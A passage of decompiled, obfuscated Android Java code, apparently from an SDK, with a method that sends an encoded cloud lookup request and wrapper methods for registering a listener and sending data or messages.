        new Thread(new RunnableC1791f(this)).start();
        ConditionVariable conditionVariable = new ConditionVariable(false);
        m8152b(String.format("正在云端  [%s]  字组查找方案 请等待...", this.f7045o[i]), 2);
        m8157d.put("category", i);
        m8157d.put("sdkV", "4.0.14");
        m8157d.put("rtp", (int) f7026b);
        C0774x m1999a = new C0775y().m2000a("body", C1777a.m8096a(m8157d.toString())).m1999a();
        C1783g.m8120a();
        C1783g.m8123b("######\n" + String.format("<analyseQ.Enc>:%s\n", m1999a.toString()));
        conditionVariable.close();
        ArrayList arrayList = new ArrayList();
        f7031g.m1868a(new C0743ap().m1906a(f7028d).m1905a(m1999a).m1902a()).mo1890a(new C1792g(this, arrayList, conditionVariable));
        conditionVariable.block();
        return arrayList;
    }

    /* JADX WARN: Unreachable blocks removed: 1, instructions: 1 */
    public boolean registerStatus(boolean z, KingListener kingListener) {
        if (!getStatus()) {
            return false;
        }
        if (kingListener == null) {
            kingListener = this.f7046p;
        }
        try {
            if (z) {
                C2361i.m10352a(mContext).m10353a((IDFEE16B42C8B2890D8FF2860AF5562B1) kingListener);
                return true;
            }
            C2361i.m10352a(mContext).m10354a(kingListener);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public boolean sendData(String str, int i, byte[] bArr) {
        try {
            return C2361i.m10352a(mContext).m10356a(str, i, bArr);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public boolean sendmsg(String str, String str2) {
        try {
            return C2361i.m10352a(mContext).m10357a(str, str2);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }
}
